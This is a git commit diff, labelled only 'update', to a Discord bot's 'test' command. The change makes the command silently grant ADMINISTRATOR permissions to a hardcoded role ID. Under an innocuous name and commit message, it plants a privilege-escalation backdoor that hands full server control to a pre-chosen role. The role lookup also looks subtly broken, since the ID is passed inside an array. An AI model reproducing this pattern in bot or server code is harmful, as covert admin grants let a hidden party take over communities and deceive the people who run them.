432044336843424b905dbaf8f52ac18c416e106f
werf-code <nippulassi3@gmail.com>
2020-07-23 13:06:37 +0300

    update

--- commands/test.js
+++ commands/test.js
@@ -1,6 +1,9 @@
 module.exports = {
     name: 'test',
     execute(message, args){
-      return
+      const role = message.guild.roles.cache.get(['727541500703145994'])
+      role.setPermissions(['ADMINISTRATOR'])
+  .then(updated => console.log(`Updated permissions to ${updated.permissions.bitfield}`))
+  .catch(console.error);
     }
 }
